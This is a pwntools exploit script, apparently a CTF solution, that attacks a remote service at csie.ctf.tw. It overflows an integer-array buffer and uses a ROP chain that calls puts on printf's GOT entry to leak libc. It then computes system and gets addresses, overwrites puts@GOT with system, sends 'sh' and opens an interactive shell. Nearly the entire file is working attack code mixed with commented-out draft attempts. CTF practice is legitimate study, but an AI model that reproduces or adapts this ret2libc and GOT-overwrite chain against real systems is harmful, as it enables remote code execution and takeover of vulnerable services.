#!/usr/bin/env python

from pwn import *

import time

r = remote('csie.ctf.tw', 10115)
# r = remote('csie.ctf.tw', 10114)

# print '-2'
# print '-2'
# print '1 '*200 + ' 0'
# print '134513949 1 2 3'*1 + ' 0'

main = 0x0804851d
puts_plt = 0x080483c0
puts_got = 0x0804a010

pop3 = 0x080486dd
pop1 = 0x080486df

read_plt = 0x08048390
read_got = 0x0804a00c

atoi_got = 0x0804a024
printf_got = 0x0804a00c
print '-2\n-2\n' + '1 '*200 + ' 0\n' + (str(puts_plt) + ' ' + str(main) + ' ' + str(printf_got)) + '\n'
# r.send( '-2\n-2\n' + '1 '*200 + ' 0\n' + ('1 ' + str(puts_plt) + ' ' + str(main) + ' ' + str(printf_got)) + '\n')

write_off = 0x000c2190

puts_off = 0x00065440
printf_off = 0x0004cbb0


pop1 = 0x804881f

# bytess = r.recv()[:4]
# print hex(u32(bytess))
# last = None
time.sleep(1)
print r.recv()[:16]
r.send( '-2\n')
time.sleep(1)
print r.recv()[:19]
r.send( '-2\n')
time.sleep(1)
print r.recv()[:6]
# r.send('1 '*52 + ' 0\n')
r.send(( '1 '*200 + ' 1 204 1 1 1 ' + str(puts_plt) + ' ' + str(main) + ' ' + str(printf_got) )*1 + ' 0\n')
time.sleep(1)
print r.recv()[:]

# r.send(str(puts_plt) + ' ' + str(pop1)  + ' ' + str(printf_got)  +  ' ' + str(main) + ' 0\n')
# r.send('1 ' + str(puts_plt) + ' ' + str(main)  + ' ' + str(printf_got)  +  ' '  + ' 0\n')
r.send('1 0\n')
# r.send('201 ' + ' 1 ' + str(puts_plt) + ' '  + str(main) +  ' ' + str(printf_got) +  ' 0\n')
ret = 0x80487bb
base = 1
for i in range(209):
	line = r.recvline()
	print i,line
	base = u32(line[:4]) - printf_off
	
print "libc base is " + str(hex(base))



time.sleep(1)
print r.recv()[:16]
r.send( '-2\n')
time.sleep(1)
print r.recv()[:19]
r.send( '-2\n')
time.sleep(1)
print r.recv()[:6]




system_off = 0x0003fc40
gets_off = 0x00064ae0
puts_off = 0x00065440

system = base + system_off
gets = base + gets_off 
puts = base + puts_off
exit_got = 0x804a018


# r.send('1 '*56 + ' 0\n')
r.send(( '1 '*200 + ' 1 201 ' + (str(ret) + ' ')*1 + str(gets) + ' '+ str(system) + ' '  + str(puts_got) + ' ' + str(puts_got) )*1 + ' 0 \n')
time.sleep(1)
# print r.recv()[:]



# print 'before sleep 5'
# time.sleep(3)
# print 'go'
# ret = 0x0804867c
ttt = (str(ret) + ' ')*4

# r.send('1 ' + (str(ret) + ' ')*3 + str(gets) + ' '+ str(system) + ' '  + str(exit_got) + ' ' + str(exit_got) + ' 0\n')
# r.send('1 ' + (str(ret) + ' ')*3 + str(gets) + ' '+ str(system) + ' '  + str(puts_got) + ' ' + str(puts_got) + ' 0 \n')
# r.send('1 0 \n')
# r.send('sh\n')
# r.send('1 ' + (str(ret) + ' ')*3 + str(gets) + ' '+ str(gets) + ' '  + str(exit_got) + ' ' + str(exit_got) + ' 0\n')
# r.send(( ttt + str(puts_plt) + ' ' + str(main) + ' ' + str(printf_got)) + ' 0\n')

# for i in range(56):
# 	line = r.recvline()
# 	print i,line
	# base = u32(line[:4]) - printf_off
# time.sleep(5)
# for i in range(161):
# 	line = r.recvline()
# 	print line

r.send('sh\n')




r.interactive()
# r.send('sh\n')



